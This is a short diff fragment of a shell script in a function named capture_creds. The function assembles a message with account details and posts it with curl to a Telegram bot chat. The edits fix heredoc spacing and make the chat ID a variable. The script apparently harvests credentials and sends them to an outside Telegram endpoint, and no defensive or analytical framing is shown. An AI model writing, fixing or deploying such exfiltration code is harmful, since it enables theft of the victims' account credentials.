@@ -434,7 +434,7 @@ capture_creds() {
 	hippo="Hello from hippo! The system time is $(date)"
 	
 	# Prepare message payload
-	MESSAGE=$(cat <<EOF
+	MESSAGE=$(cat << EOF
 	Notification:
 	• Hippo: $hippo
 	• Account: $ACCOUNT
@@ -444,7 +444,7 @@ capture_creds() {
 	
 	# Send via Telegram Bot API using curl
 	curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-	  --data-urlencode "chat_id=$8051672152" \
+	  --data-urlencode "chat_id=${CHAT_ID}" \
 	  --data-urlencode "text=${MESSAGE}" \
 	  > /dev/null
 	
